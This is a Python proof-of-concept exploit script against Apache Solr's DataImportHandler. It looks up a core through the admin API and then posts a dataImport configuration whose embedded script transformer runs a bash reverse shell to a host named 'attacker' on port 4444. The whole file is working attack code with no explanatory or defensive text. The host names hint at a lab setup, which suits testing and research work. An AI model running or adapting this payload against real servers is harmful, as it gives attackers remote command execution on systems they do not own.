import requests

TARGET = "http://solr:8983"
LHOST = "attacker"
LPORT = 4444

PAYLOAD = f"""<dataConfig>
  <script><![CDATA[
    function poc(){{
      var cmd = Java.to(["/bin/bash","-c","bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"], "java.lang.String[]");
      java.lang.Runtime.getRuntime().exec(cmd);
    }}
  ]]></script>
  <document>
    <entity name="e" fileName=".*" baseDir="/tmp"
            processor="FileListEntityProcessor" recursive="false"
            transformer="script:poc" />
  </document>
</dataConfig>"""


def get_core():
    cores = requests.get(f"{TARGET}/solr/admin/cores?wt=json", timeout=10).json()["status"]
    if not cores:
        print("core not found")
        return
    core = next(iter(cores))
    print(f"core: {core}")
    return core


def exploit():
    core = get_core()
    data = {
        "command": "full-import",
        "clean": "false",
        "commit": "true",
        "core": core,
        "name": "poc",
        "dataConfig": PAYLOAD,
    }
    try:
        requests.post(f"{TARGET}/solr/{core}/dataimport", data=data, timeout=10)
        print("payload sent")
    except requests.exceptions.RequestException:
        print("payload failed")
        return

if __name__ == "__main__":
    exploit()
